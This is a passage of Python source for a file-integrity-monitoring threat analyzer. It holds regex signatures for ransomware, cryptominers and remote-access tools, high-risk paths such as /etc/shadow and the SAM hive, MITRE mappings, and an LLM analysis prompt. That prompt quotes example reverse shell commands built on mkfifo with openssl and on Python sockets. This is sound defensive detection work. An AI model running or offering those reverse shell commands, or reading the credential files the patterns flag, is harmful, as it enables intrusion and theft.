_p(r'bcdedit\s+/set.*recoveryenabled\s+no', 'ransomware', 10, 'Boot recovery disabled (ransomware)')

# Cryptominer Indicators

_p(r'stratum\+tcp://|stratum\+ssl://', 'cryptominer', 9, 'Mining pool connection (cryptominer)')
_p(r'xmrig|cpuminer|cgminer|bfgminer|ethminer', 'cryptominer', 10, 'Known cryptominer binary')
_p(r'--coin\s*=|--algo\s*=.*cryptonight|--donate-level', 'cryptominer', 10, 'Cryptominer command-line arguments')
_p(r'coinhive|cryptoloot|webminer|coin-hive', 'cryptominer', 10, 'Browser-based cryptominer')
_p(r'hashrate|mining.*pool|wallet.*address.*mining', 'cryptominer', 8, 'Mining-related terminology')

# Trojan / RAT Indicators

_p(r'covenant|empire|cobalt.?strike|sliver', 'rat', 10, 'Known C2 framework reference')
_p(r'TeamServer|BeaconPayload|StagelessPayload', 'rat', 10, 'Cobalt Strike component')
_p(r'njrat|darkcomet|asyncrat|quasar.*rat|nanocore', 'rat', 10, 'Known RAT tool')
_p(r'reverse_tcp|reverse_https|bind_tcp', 'rat', 9, 'Meterpreter payload type')
_p(r'pyinstaller.*onefile.*noconsole', 'rat', 8, 'PyInstaller hidden executable (common RAT packaging)')
_p(r'pwncat|villain|havoc|mythic|brute.?ratel', 'rat', 10, 'Known C2/post-exploitation framework')

# Suspicious File Paths (in content)

_p(r'C:\\Windows\\System32\\config\\SAM', 'suspicious_path', 9, 'Reference to SAM database path')
_p(r'C:\\Windows\\NTDS\\ntds\.dit', 'suspicious_path', 9, 'Active Directory database reference')
_p(r'/var/log/auth\.log|/var/log/secure', 'suspicious_path', 6, 'Auth log access')
_p(r'/tmp/\.hidden|/dev/shm/\.\w+', 'suspicious_path', 8, 'Hidden file in temp/shared memory')
_p(r'C:\\Windows\\Temp\\.*\.(exe|dll|bat|ps1)', 'suspicious_path', 8, 'Executable in Windows Temp directory')


# Suspicious Path Patterns (file location analysis)

HIGH_RISK_PATHS = [
    # Cross-platform system directories
    (re.compile(r'(system32|windows\\system|syswow64)', re.I), 8, 'System directory modification'),
    (re.compile(r'(/etc/(passwd|shadow|sudoers|ssh))', re.I), 9, 'Critical system config'),
    (re.compile(r'(\.ssh/(authorized_keys|id_rsa|config))', re.I), 9, 'SSH key/config modification'),
    (re.compile(r'(cron\.d|crontab|init\.d|systemd)', re.I), 8, 'Service/cron modification'),
    (re.compile(r'([\\/]startup[\\/]|[\\/]autostart[\\/]|autorun\.inf\b|run\\)', re.I), 7, 'Auto-start location'),

    # Windows-specific paths
    (re.compile(r'system32\\config\\(SAM|SECURITY|SYSTEM)', re.I), 10, 'Windows registry hive file'),
    (re.compile(r'system32\\drivers\\', re.I), 9, 'Kernel driver directory'),
    (re.compile(r'system32\\Tasks\\', re.I), 8, 'Scheduled task definition'),
    (re.compile(r'system32\\GroupPolicy\\', re.I), 8, 'Group policy modification'),
    (re.compile(r'system32\\winevt\\Logs\\', re.I), 7, 'Windows event log modification'),
    (re.compile(r'drivers\\etc\\hosts', re.I), 8, 'Hosts file (DNS override)'),
    (re.compile(r'Start\s*Menu\\Programs\\Startup', re.I), 8, 'User startup persistence'),
    (re.compile(r'CurrentVersion\\Run', re.I), 9, 'Registry autorun key'),

    # macOS-specific paths
    (re.compile(r'LaunchDaemons/', re.I), 9, 'macOS LaunchDaemon (system persistence)'),
    (re.compile(r'LaunchAgents/', re.I), 8, 'macOS LaunchAgent (user persistence)'),
    (re.compile(r'/System/Library/', re.I), 8, 'macOS core system framework'),
    (re.compile(r'/var/db/dslocal/', re.I), 9, 'macOS local directory service (accounts)'),
    (re.compile(r'/etc/authorization', re.I), 9, 'macOS authorization config'),
    (re.compile(r'/Library/Security/', re.I), 8, 'macOS security framework extension'),

    # Linux-specific paths
    (re.compile(r'/boot/', re.I), 9, 'Boot loader / kernel image'),
    (re.compile(r'/lib/modules/', re.I), 9, 'Kernel modules directory'),
    (re.compile(r'/etc/pam\.d/', re.I), 9, 'PAM authentication module'),
    (re.compile(r'/(usr/)?lib/.*\.so', re.I), 7, 'Shared library modification'),
    (re.compile(r'/var/spool/cron/', re.I), 8, 'User crontab directory'),
    (re.compile(r'/etc/systemd/system/', re.I), 8, 'Custom systemd service'),
]

HIGH_RISK_EXTENSIONS = {
    '.exe': 7, '.dll': 7, '.sys': 8, '.bat': 7, '.ps1': 7,
    '.sh': 6, '.cmd': 7, '.msi': 7, '.scr': 8, '.vbs': 7,
    '.wsf': 7, '.hta': 8, '.jar': 6, '.war': 6, '.elf': 8,
    '.bin': 7, '.com': 8, '.pif': 8, '.cpl': 8, '.inf': 6,
}


# MITRE ATT&CK Mapping + Threat Classifications

MITRE_MAPPING: Dict[str, Dict] = {
    'reverse_shell': {
        'techniques': ['T1059.004', 'T1071.001', 'T1573.002'],
        'tactic': 'Execution / Command & Control',
    },
    'bind_shell': {
        'techniques': ['T1059.004'],
        'tactic': 'Execution',
    },
    'webshell': {
        'techniques': ['T1505.003'],
        'tactic': 'Persistence',
    },
    'credential_theft': {
        'techniques': ['T1003', 'T1555', 'T1552'],
        'tactic': 'Credential Access',
    },
    'priv_escalation': {
        'techniques': ['T1548', 'T1068'],
        'tactic': 'Privilege Escalation',
    },
    'persistence': {
        'techniques': ['T1053', 'T1547', 'T1543'],
        'tactic': 'Persistence',
    },
    'exfiltration': {
        'techniques': ['T1041', 'T1048'],
        'tactic': 'Exfiltration',
    },
    'obfuscation': {
        'techniques': ['T1027', 'T1140'],
        'tactic': 'Defense Evasion',
    },
    'evasion': {
        'techniques': ['T1562.001', 'T1070'],
        'tactic': 'Defense Evasion',
    },
    'process_injection': {
        'techniques': ['T1055'],
        'tactic': 'Defense Evasion / Privilege Escalation',
    },
    'c2_callback': {
        'techniques': ['T1071', 'T1105'],
        'tactic': 'Command & Control',
    },
    'ransomware': {
        'techniques': ['T1486'],
        'tactic': 'Impact',
    },
    'cryptominer': {
        'techniques': ['T1496'],
        'tactic': 'Impact',
    },
    'rat': {
        'techniques': ['T1219'],
        'tactic': 'Command & Control',
    },
    'destructive': {
        'techniques': ['T1485', 'T1561'],
        'tactic': 'Impact',
    },
    'recon': {
        'techniques': ['T1046', 'T1087'],
        'tactic': 'Discovery',
    },
    'suspicious_exec': {
        'techniques': ['T1059'],
        'tactic': 'Execution',
    },
    'suspicious_path': {
        'techniques': ['T1036'],
        'tactic': 'Defense Evasion',
    },
}

THREAT_CLASSIFICATIONS: Dict[str, str] = {
    'reverse_shell': 'Reverse Shell - Establishes outbound connection to attacker-controlled host, redirecting shell I/O over the network for remote command execution.',
    'bind_shell': 'Bind Shell - Opens a listening port on the compromised host, allowing inbound attacker connections for remote shell access.',
    'webshell': 'Web Shell - Server-side script providing remote access and command execution through a web interface.',
    'credential_theft': 'Credential Theft - Extracts, dumps, or harvests authentication credentials (passwords, hashes, tokens, keys).',
    'priv_escalation': 'Privilege Escalation - Attempts to gain higher-level permissions (root/SYSTEM) beyond those currently authorized.',
    'persistence': 'Persistence Mechanism - Installs hooks to survive reboots and maintain access (cron, registry, services, startup).',
    'exfiltration': 'Data Exfiltration - Transfers sensitive data out of the environment to an attacker-controlled destination.',
    'obfuscation': 'Obfuscation / Encoding - Uses encoding, encryption, or packing to conceal malicious payload from detection.',
    'evasion': 'Security Evasion - Disables or bypasses security controls (AV, logging, AMSI, firewalls).',
    'process_injection': 'Process Injection - Injects code into another running process to execute under its context and evade detection.',
    'c2_callback': 'C2 Callback - Establishes command-and-control communication channel with attacker infrastructure.',
    'ransomware': 'Ransomware - Encrypts files and demands payment for decryption keys.',
    'cryptominer': 'Cryptominer - Hijacks system resources to mine cryptocurrency without authorization.',
    'rat': 'Remote Access Trojan - Provides persistent covert remote control of the compromised system.',
    'destructive': 'Destructive Action - Deletes, overwrites, or corrupts data and system resources.',
    'recon': 'Reconnaissance - Enumerates system information, network topology, users, or services.',
    'suspicious_exec': 'Suspicious Execution - Spawns shell processes or executes commands in a pattern consistent with exploitation.',
    'suspicious_path': 'Suspicious File Location - File resides in or references a path commonly abused by malware.',
}

# Regex for extracting IOCs (IPs, ports) from content
_IOC_IP_PORT = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[:\s]+(\d{2,5})')
_IOC_IP = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
_IOC_DOMAIN = re.compile(r'\b([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:com|net|org|io|xyz|tk|cc|ru|cn|top|info|biz))\b', re.I)

_REFERENCE_PATH_HINTS = (
    '/test', '\\test', '/tests', '\\tests',
    '/docs', '\\docs', '/example', '\\example', 'readme',
)
_REFERENCE_LINE_HINTS = (
    'logger.', 'logging.', 'console.', 'print(', 'print ',
    'debug(', 'heuristic', 'threat', 'indicator', 'mitre',
    'analysis', 'detection', 'example', 'tutorial', 'signature',
)
_EXECUTION_HINTS = (
    'exec(', 'system(', 'subprocess', 'popen', 'createprocess',
    'invoke-expression', 'iex', 'powershell', '/bin/sh', 'cmd.exe',
    'setuid', 'setgid', 'chmod', 'sudo ', 'writememory',
)

_CONTEXT_SENSITIVE_CATEGORIES = {
    'priv_escalation', 'suspicious_exec', 'recon', 'c2_callback',
}


def _line_at_offset(text: str, offset: int) -> str:
    """Return the full line containing the character offset."""
    start = text.rfind('\n', 0, offset) + 1
    end = text.find('\n', offset)
    if end == -1:
        end = len(text)
    return text[start:end].strip()


def _is_comment_like_line(line: str) -> bool:
    stripped = line.lstrip()
    return stripped.startswith(('#', '//', '/*', '*', '--', ';'))


def _is_string_literal_reference(line: str, token: str) -> bool:
    if not token:
        return False
    escaped = re.escape(token)
    return bool(re.search(rf'["\'][^"\']*{escaped}[^"\']*["\']', line, re.I))


def _has_execution_context(line: str) -> bool:
    low = line.lower()
    return any(hint in low for hint in _EXECUTION_HINTS)


def _is_reference_context(file_path: str, line: str, token: str) -> bool:
    low_path = file_path.lower()
    low_line = line.lower()

    if any(hint in low_path for hint in _REFERENCE_PATH_HINTS):
        return True

    if _is_comment_like_line(line):
        return True

    if _is_string_literal_reference(line, token) and not _has_execution_context(line):
        return True

    if any(hint in low_line for hint in _REFERENCE_LINE_HINTS) and not _has_execution_context(line):
        return True

    return False


def _is_context_sensitive_indicator(category: str, description: str) -> bool:
    low_desc = description.lower()
    if category in _CONTEXT_SENSITIVE_CATEGORIES and category != 'priv_escalation':
        return True
    if category == 'priv_escalation' and (
        'terminology' in low_desc
        or 'indicator' in low_desc
        or 'enumeration' in low_desc
    ):
        return True
    return False


def _adjust_indicator_severity(
    base_severity: int,
    category: str,
    description: str,
    match_count: int,
    reference_hits: int,
    context_sensitive: bool,
) -> int:
    """Lower score for weak indicators used as references/tests/docs."""
    adjusted = base_severity

    if context_sensitive and match_count > 0:
        if reference_hits == match_count:
            adjusted = max(2, base_severity - 4)
        elif reference_hits > 0:
            adjusted = max(3, base_severity - 2)

    # Explicitly keep terminology-only hits from becoming high by themselves.
    if category == 'priv_escalation' and 'terminology' in description.lower():
        adjusted = min(adjusted, 5)

    return adjusted


def _is_probable_code_domain_false_positive(content: str, start: int, end: int, candidate: str) -> bool:
    """Filter method/property lookups that resemble domains (e.g. logger.info)."""
    low = candidate.lower()

    if re.fullmatch(r'[a-z_][a-z0-9_]*\.(info|debug|warning|error|critical)', low):
        return True

    prev_char = content[start - 1] if start > 0 else ''
    next_char = content[end] if end < len(content) else ''

    if next_char == '(':
        return True

    if prev_char in '._':
        return True


    return False


def _extract_iocs(content: str) -> List[str]:
    """Extract IOCs (IP:port, IPs, domains) from content."""
    iocs: List[str] = []
    seen = set()

    def _append(value: str):
        if value and value not in seen:
            seen.add(value)
            iocs.append(value)

    if not content:
        return iocs

    # IP:port pairs first
    for m in _IOC_IP_PORT.finditer(content):
        ip, port = m.group(1), m.group(2)
        if not ip.startswith(('0.', '127.0.0.1', '255.')):
            _append(f"{ip}:{port}")

    # Standalone IPs
    for m in _IOC_IP.finditer(content):
        ip = m.group(1)
        if not ip.startswith(('0.', '127.0.0.', '255.')):
            _append(ip)

    # Suspicious domains (skip common code symbols like logger.info)
    for m in _IOC_DOMAIN.finditer(content):
        candidate = m.group(1)
        start, end = m.span(1)
        if _is_probable_code_domain_false_positive(content, start, end, candidate):
            continue
        _append(candidate)

    return iocs[:10]  # Cap at 10


# Context-Aware Diff Parsing

_CURRENT_CONTENT_MARKER = "=== CURRENT CONTENT (snippet) ==="
_UNIFIED_DIFF_MARKER = "=== UNIFIED DIFF (before -> after) ==="


def _extract_active_scan_content(content: str) -> str:
    """
    If the analyzer input is a contextual payload containing previous/current
    snippets and a unified diff, focus scanning on current content plus added
    lines. This avoids scoring removed code as active behavior.
    """
    if not content:
        return ''

    if _CURRENT_CONTENT_MARKER not in content:
        return content

    current_match = re.search(
        rf'{re.escape(_CURRENT_CONTENT_MARKER)}\n([\s\S]*?)(?:\n{re.escape(_UNIFIED_DIFF_MARKER)}|$)',
        content,
    )
    current_section = current_match.group(1).strip() if current_match else content

    diff_match = re.search(
        rf'{re.escape(_UNIFIED_DIFF_MARKER)}\n([\s\S]*)',
        content,
    )
    if not diff_match:
        return current_section

    added_lines: List[str] = []
    for line in diff_match.group(1).splitlines():
        if line.startswith('+') and not line.startswith('+++'):
            added_lines.append(line[1:])

    if not added_lines:
        return current_section

    return (
        f"{current_section}\n\n"
        f"# Added lines in this change:\n"
        f"{chr(10).join(added_lines)}"
    )


def _summarize_change_from_context(content: Optional[str]) -> str:
    """Summarize contextual before/current/diff payloads for analyst display."""
    if not content or "[Context-Aware Change Analysis]" not in content:
        return ''

    added = re.search(r'^Added lines:\s*(\d+)', content, re.MULTILINE)
    removed = re.search(r'^Removed lines:\s*(\d+)', content, re.MULTILINE)
    added_count = added.group(1) if added else '0'
    removed_count = removed.group(1) if removed else '0'
    return (
        f"Modified file was compared against the previous snippet: "
        f"{added_count} line(s) added and {removed_count} line(s) removed."
    )

# Content Summary (for readable files)

def _summarize_content(content: str, file_path: str) -> str:
    """
    Generate a brief human-readable summary of what a file contains.
    Used to give context in the analysis reasoning for all files,
    not just malicious ones.
    """
    if not content or content.strip() == '':
        return ''
    if content.strip() in ('Binary/Unreadable', 'File deleted'):
        return ''

    lines = content.strip().splitlines()
    total_lines = len(lines)
    non_empty = [l.strip() for l in lines if l.strip()]
    ext = os.path.splitext(file_path.lower())[1]

    # Collect observable features
    features = []

    # Detect language-specific patterns
    imports = [l for l in non_empty[:30] if l.startswith(('import ', 'from ', '#include', 'using ', 'require', 'const ', 'var ', 'let '))]
    functions = [l for l in non_empty[:50] if l.startswith(('def ', 'function ', 'func ', 'fn ', 'public ', 'private ', 'async '))]
    classes = [l for l in non_empty[:50] if l.startswith(('class ',))]

    if classes:
        class_names = [l.split('class ')[1].split('(')[0].split(':')[0].split('{')[0].strip() for l in classes[:3]]
        features.append(f"defines class{'es' if len(class_names) > 1 else ''}: {', '.join(class_names)}")
    if functions:
        func_names = []
        for l in functions[:4]:
            # Extract function name
            for prefix in ('def ', 'function ', 'func ', 'fn ', 'async def ', 'async function '):
                if prefix in l:
                    name = l.split(prefix)[-1].split('(')[0].strip()
                    if name:
                        func_names.append(name)
                    break
        if func_names:
            features.append(f"defines function{'s' if len(func_names) > 1 else ''}: {', '.join(func_names[:4])}")
    if imports:
        modules = []
        for l in imports[:5]:
            if l.startswith('from '):
                modules.append(l.split('from ')[1].split(' ')[0])
            elif l.startswith('import '):
                modules.append(l.split('import ')[1].split(',')[0].split(' ')[0])
        if modules:
            features.append(f"imports: {', '.join(modules[:5])}")

    # Config/data patterns
    if ext in ('.json', '.yaml', '.yml', '.toml', '.ini', '.cfg', '.conf', '.env'):
        key_vals = [l for l in non_empty[:10] if '=' in l or ':' in l]
        if key_vals:
            features.append(f"contains {len(key_vals)}+ configuration entries")

    # Markup
    if ext in ('.html', '.htm', '.xml', '.svg'):
        features.append("markup document")
    if ext in ('.md', '.rst', '.txt'):
        if non_empty:
            first_line = non_empty[0][:80]
            features.append(f"text starting with: \"{first_line}\"")

    # Shell scripts
    if non_empty and non_empty[0].startswith('#!'):
        features.append(f"shebang: {non_empty[0][:40]}")

    # Fallback - show first meaningful line
    if not features and non_empty:
        first_line = non_empty[0][:80]
        features.append(f"starts with: \"{first_line}\"")

    if not features:
        return ''

    size_note = f"{total_lines} line{'s' if total_lines != 1 else ''}"
    return f"File content ({size_note}): {'; '.join(features)}."


# Main Analysis Function

def analyze_file_change(
    file_path: str,
    change_type: str,
    diff: Optional[str] = None,
    metadata: Optional[Dict] = None,
) -> Dict[str, Any]:
    """
    Analyze a file change with the configured LLM provider chain:

        1. Local Ollama  (settings.ollama_model - defaults to gemma4:latest)
        2. Gemini REST   (only when settings.gemini_api_key is set)
        3. Heuristic engine (always available, regex-based)

    Each stage is tried in order; the first to return a parseable
    analysis dict wins. The LLM performs deep contextual reasoning;
    the heuristic engine is the lightweight floor.
    """
    # Build OS-aware context for the LLM
    os_context_block = _get_llm_context(file_path, change_type)

    # Send up to 6000 chars of content for thorough analysis
    content_block = diff[:6000] if diff else 'No content available'

    baseline_note = ""
    if metadata and metadata.get("is_baseline"):
        baseline_note = (
            "NOTE: This event is part of baseline initialization. "
            "Do not flag solely due to system directory location; "
            "rely on content-based indicators."
        )

    registry_note = ""
    if metadata and metadata.get("registry"):
        registry_note = (
            "\n=== File Identity Registry Context ===\n"
            f"{json.dumps(metadata.get('registry'), ensure_ascii=False)}\n"
            "Use this context to reason about what the file controls. "
            "For non-baseline changes, a critical identity role can raise "
            "severity even when the content snippet is empty, binary, or benign.\n"
        )
        if metadata.get("registry_signal"):
            registry_note += (
                "Registry Risk Signal: "
                f"{json.dumps(metadata.get('registry_signal'), ensure_ascii=False)}\n"
            )

    prompt_text = f"""You are an expert threat analyst on a File Integrity Monitoring (FIM) system.
Your job is to perform DEEP PROACTIVE ANALYSIS of file changes to identify threats.

=== EVENT DETAILS ===
File Path: {file_path}
Change Type: {change_type}
Metadata: {json.dumps(metadata) if metadata else 'N/A'}
Baseline: {bool(metadata and metadata.get("is_baseline"))}
{baseline_note}
{registry_note}

=== Platform Context ===
{os_context_block}

=== File Content ===
{content_block}

=== YOUR ANALYSIS TASKS ===
1. IDENTIFY the threat type: Is this a reverse shell, bind shell, webshell, ransomware, cryptominer, RAT, credential theft, privilege escalation, persistence mechanism, data exfiltration, C2 callback, obfuscation, or benign?

2. EXPLAIN what the content does step-by-step. For example, if it creates a named pipe, launches a shell, and tunnels through OpenSSL - explain each step and how they combine into an attack.

3. IF the file content contains "Context-Aware Change Analysis", compare the previous content, current content, and unified diff. Base severity on the current file and newly added lines. Mention removed dangerous code as remediation, not as an active threat.

4. CLASSIFY the severity accurately:
   - A file containing "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect IP:PORT > /tmp/s" is a CRITICAL encrypted reverse shell, NOT just suspicious.
   - A file containing "import socket; s.connect((IP,PORT)); os.dup2()" is a CRITICAL reverse shell.
   - A normal config or log file is LOW/INFO.

5. MAP to MITRE ATT&CK techniques (e.g., T1059.004 for command shell, T1573.002 for encrypted channel, T1071.001 for application layer protocol).

6. EXTRACT IOCs: IP addresses, ports, domains, file paths used by the payload.

=== PRIORITY GUIDELINES ===
- critical: Reverse shells, bind shells, webshells, ransomware, rootkits, credential dumping, active exploitation
- high: Persistence mechanisms, privilege escalation, C2 callbacks, security evasion
- medium: Suspicious execution patterns, recon tools, obfuscated code
- low: Minor config changes, log modifications, non-threatening scripts
- info: Build artifacts, documentation, routine file changes

=== RESPONSE FORMAT ===
Return ONLY valid JSON with ALL of these keys:
- risk_score: integer 0 (safe) to 10 (critical threat)
- priority: one of "critical", "high", "medium", "low", "info"
- is_malicious: boolean (true if content is weaponized/malicious)
- threat_type: string identifying the threat category (e.g., "reverse_shell", "ransomware", "credential_theft", "persistence", "benign")
- threat_classification: one-line human-readable label (e.g., "OpenSSL Encrypted Reverse Shell")
- mitre_attack: array of MITRE ATT&CK technique IDs (e.g., ["T1059.004", "T1573.002"])
- iocs: array of IOC strings extracted from the content (IPs, ports, domains)
- change_summary: one sentence describing exactly what changed, especially added/removed risky behavior when a diff is present
- recommended_actions: array of 2-5 concise analyst actions appropriate to the priority
- reasoning: detailed explanation of WHAT the payload does and WHY it is dangerous (5-8 sentences). Walk through the attack chain step-by-step, referencing specific commands, functions, or code patterns you found in the content. Explain the overall goal of the payload (e.g., "establishes a persistent encrypted reverse shell") and then describe each stage: how it sets up the connection, what shell it spawns, how I/O is redirected, and what the attacker gains. Mention any evasion techniques used. For benign files, explain why no threat was found and what the file's legitimate purpose appears to be.
"""

    # Provider chain: Ollama -> Gemini -> heuristic.
    analysis = _call_ollama(prompt_text)
    source = 'ollama' if analysis is not None else None

    if analysis is None and settings.gemini_api_key:
        from core.services.gemini_client import analyze_with_gemini
        analysis = analyze_with_gemini(prompt_text)
        if analysis is not None:
            source = 'gemini'

    if analysis is None:
        return _fallback_analysis(file_path, change_type, diff, metadata)

    return _enrich_llm_analysis(analysis, diff, source=source or 'llm')


def _call_ollama(prompt_text: str) -> Optional[Dict[str, Any]]:
    """POST the prompt to Ollama. Returns the parsed inner JSON or None on any failure."""
    payload = {
        "model": settings.ollama_model,
        "prompt": prompt_text,
        "stream": False,
        "format": "json",
    }
    try:
        response = requests.post(
            settings.ollama_url, json=payload, timeout=settings.ollama_timeout,
        )
        if response.status_code != 200:
            return None
        envelope = response.json()
    except (requests.RequestException, ValueError):
        return None

    response_text = envelope.get('response', '') if isinstance(envelope, dict) else ''
    if "```json" in response_text:
        response_text = response_text.split("```json")[1].split("```")[0].strip()
    elif "```" in response_text:
        response_text = response_text.split("```")[1].split("```")[0].strip()

    try:
        return json.loads(response_text)
    except json.JSONDecodeError:
        return None


def _enrich_llm_analysis(
    analysis: Dict[str, Any],
    diff: Optional[str],
    source: str,
) -> Dict[str, Any]:
    """Apply defaults, priority mapping, MITRE/IOC enrichment, and tag the source."""
    analysis.setdefault('risk_score', 5)
    analysis.setdefault('is_malicious', False)
    analysis.setdefault('threat_type', 'unknown')
    analysis.setdefault('threat_classification', '')
    analysis.setdefault('mitre_attack', [])
    analysis.setdefault('iocs', [])
    analysis.setdefault('change_summary', '')
    analysis.setdefault('recommended_actions', _default_recommended_actions(
        int(analysis.get('risk_score', 5) or 5),
        str(analysis.get('threat_type', 'unknown')),
    ))

    valid_priorities = {'critical', 'high', 'medium', 'low', 'info'}
    if analysis.get('priority') not in valid_priorities:
        analysis['priority'] = _score_to_priority(analysis['risk_score'])

    threat_type = analysis.get('threat_type', 'unknown')
    if not analysis['mitre_attack'] and threat_type in MITRE_MAPPING:
        analysis['mitre_attack'] = MITRE_MAPPING[threat_type]['techniques']

    if not analysis['threat_classification'] and threat_type in THREAT_CLASSIFICATIONS:
        analysis['threat_classification'] = THREAT_CLASSIFICATIONS[threat_type]

    if not analysis['iocs'] and diff:
        analysis['iocs'] = _extract_iocs(diff)

    if _missing_reasoning(analysis.get('reasoning')):
        analysis['reasoning'] = _synthesize_llm_reasoning(analysis)

    analysis['analysis_source'] = source
    return analysis


def _missing_reasoning(reasoning: Any) -> bool:
    text = str(reasoning or '').strip().lower()
    return not text or text in {'no reasoning provided', 'no reasoning provided.'}


def _synthesize_llm_reasoning(analysis: Dict[str, Any]) -> str:
    """Create useful analyst text when a model returns only sparse fields."""
    score = int(analysis.get('risk_score') or 0)
    priority = analysis.get('priority') or _score_to_priority(score)
    threat_type = str(analysis.get('threat_type') or 'unknown').replace('_', ' ')
    classification = analysis.get('threat_classification') or threat_type.title()
    change_summary = analysis.get('change_summary') or 'The model did not provide a detailed change summary.'
    mitre = analysis.get('mitre_attack') or []
    iocs = analysis.get('iocs') or []
    actions = analysis.get('recommended_actions') or []

    parts = [
        f"The model classified this event as {classification} with {priority.upper()} priority and risk {score}/10.",
        str(change_summary),
    ]
    if threat_type and threat_type != 'unknown':
        parts.append(f"The reported threat category is {threat_type}.")
    if mitre:
        parts.append(f"Mapped MITRE ATT&CK technique(s): {', '.join(str(item) for item in mitre)}.")
    if iocs:
        parts.append(f"Extracted IOC(s): {', '.join(str(item) for item in iocs)}.")
    if actions:
        parts.append(f"Immediate analyst action: {actions[0]}")
    return ' '.join(part for part in parts if part).strip()


def _score_to_priority(score: int) -> str:
    """Map numeric risk score to priority string."""
    if score >= 9:
        return 'critical'
    elif score >= 7:
        return 'high'
    elif score >= 4:
        return 'medium'
    elif score >= 2:
        return 'low'
    return 'info'


def _default_recommended_actions(score: int, threat_type: str) -> List[str]:
    """Return analyst-oriented default response guidance for an alert."""
    if score >= 8:
        actions = [
            "Isolate the host or monitored path if this change was not authorized.",
            "Verify the file owner, signer, timestamp, and deployment source.",
            "Collect the changed file, related process tree, and network indicators for investigation.",
        ]
        if threat_type and threat_type not in ('benign', 'unknown'):
            actions.append(f"Hunt for related {threat_type.replace('_', ' ')} indicators across monitored systems.")
        return actions
    if score >= 4:
        return [
            "Review the change owner and recent deployment activity.",
            "Compare the current file against the approved baseline.",
            "Escalate if the change was unexpected or appears on additional hosts.",
        ]
    return [
        "Record the event for audit history.",
        "No immediate response is required unless the change was unexpected.",
    ]


# Heuristic Analysis Engine

def _fallback_analysis(
    file_path: str,
    change_type: str,
    content: Optional[str] = None,
    metadata: Optional[Dict] = None,
) -> Dict[str, Any]:
    """
    Multi-layered heuristic analysis when Ollama is unavailable.
    Combines content scanning, path analysis, extension checks,
    and context-aware severity adjustment to reduce false positives.
    """
    findings: List[Dict[str, Any]] = []
    max_score = 0
    context_notes: List[str] = []

    lower_path = file_path.lower()
    ext = os.path.splitext(lower_path)[1]
    is_baseline = bool(metadata and metadata.get('is_baseline'))
    baseline_path_adjusted = False
    baseline_ext_adjusted = False

    active_content = _extract_active_scan_content(content) if content else ''

    # -- Layer 1: Content Pattern Matching --
    if content:
        content_to_scan = active_content[:5000]  # Scan first 5KB of active content
        for pattern, category, severity, description in THREAT_PATTERNS:
            matches = list(pattern.finditer(content_to_scan))
            if not matches:
                continue

            reference_hits = 0
            for match in matches:
                token = match.group(0) or ''
                line = _line_at_offset(content_to_scan, match.start())
                if _is_reference_context(file_path, line, token):
                    reference_hits += 1

            context_sensitive = _is_context_sensitive_indicator(category, description)
            adjusted_severity = _adjust_indicator_severity(
                base_severity=severity,
                category=category,
                description=description,
                match_count=len(matches),
                reference_hits=reference_hits,
                context_sensitive=context_sensitive,
            )

            finding = {
                'category': category,
                'severity': adjusted_severity,
                'description': description,
                'match_count': len(matches),
                'context_sensitive': context_sensitive,
            }
            if adjusted_severity != severity:
                finding['raw_severity'] = severity
            if reference_hits:
                finding['reference_hits'] = reference_hits

            findings.append(finding)
            max_score = max(max_score, adjusted_severity)

    # -- Layer 2: File Path Analysis --
    for pattern, severity, desc in HIGH_RISK_PATHS:
        if pattern.search(file_path):
            adjusted = severity
            if is_baseline:
                adjusted = min(severity, 3)
                baseline_path_adjusted = True
            entry = {
                'category': 'suspicious_path',
                'severity': adjusted,
                'description': desc,
                'match_count': 1,
                'context_sensitive': False,
            }
            if adjusted != severity:
                entry['raw_severity'] = severity
            findings.append(entry)
            max_score = max(max_score, adjusted)

    # -- Layer 3: Extension Risk --
    if ext in HIGH_RISK_EXTENSIONS:
        ext_score = HIGH_RISK_EXTENSIONS[ext]
        adjusted = ext_score
        if is_baseline:
            adjusted = min(ext_score, 3)
            baseline_ext_adjusted = True
        entry = {
            'category': 'risky_extension',
            'severity': adjusted,
            'description': f"Executable/risky file type ({ext})",
            'match_count': 1,
            'context_sensitive': False,
        }
        if adjusted != ext_score:
            entry['raw_severity'] = ext_score
        findings.append(entry)
        max_score = max(max_score, adjusted)

    # -- Layer 4: Extension-based baseline (no content findings) --
    if not findings:
        if ext in ('.conf', '.cfg', '.ini', '.env', '.key', '.pem', '.crt', '.pfx', '.yaml', '.yml'):
            max_score = 5
            findings.append({
                'category': 'config_file',
                'severity': 5,
                'description': f"Configuration/security file {change_type}",
                'match_count': 1,
                'context_sensitive': False,
            })
        elif ext in ('.py', '.js', '.ts', '.java', '.cs', '.go', '.rs', '.rb', '.c', '.cpp', '.h'):
            max_score = 4
            findings.append({
                'category': 'source_code',
                'severity': 4,
                'description': f"Source code file {change_type}. Normal during development.",
                'match_count': 1,
                'context_sensitive': False,
            })
        elif ext in ('.log', '.tmp', '.cache', '.bak', '.swp', '.lock'):
            max_score = 2
            findings.append({
                'category': 'temp_file',
                'severity': 2,
                'description': f"Temporary/log file {change_type}. Low risk.",
                'match_count': 1,
                'context_sensitive': False,
            })
        elif change_type == 'deleted':
            max_score = 5
            findings.append({
                'category': 'deletion',
                'severity': 5,
                'description': 'File deleted. Verify this was intentional.',
                'match_count': 1,
                'context_sensitive': False,
            })
        else:
            max_score = 1
            findings.append({
                'category': 'benign',
                'severity': 1,
                'description': f"File {change_type}. No threat indicators detected.",
                'match_count': 1,
                'context_sensitive': False,
            })

    if is_baseline and (baseline_path_adjusted or baseline_ext_adjusted):
        context_notes.append(
            "Baseline initialization: path/extension indicators were down-weighted."
        )

    # Guardrail: single weak indicator should not become high/critical.
    high_findings = [f for f in findings if f['severity'] >= 8]
    if len(high_findings) == 1:
        only = high_findings[0]
        if only.get('context_sensitive') and only.get('match_count', 0) <= 2:
            only['severity'] = min(only['severity'], 6)
            max_score = max(f['severity'] for f in findings)
            context_notes.append(
                f"Severity reduced because only one weak indicator was found ({only['description']})."
            )

    # Additional guardrail for test/docs/example paths.
    if any(hint in lower_path for hint in _REFERENCE_PATH_HINTS):
        strong_high = [f for f in findings if f['severity'] >= 7 and not f.get('context_sensitive')]
        if max_score >= 7 and not strong_high:
            for f in findings:
                if f['severity'] >= 7:
                    f['severity'] = 6
            max_score = max(f['severity'] for f in findings)
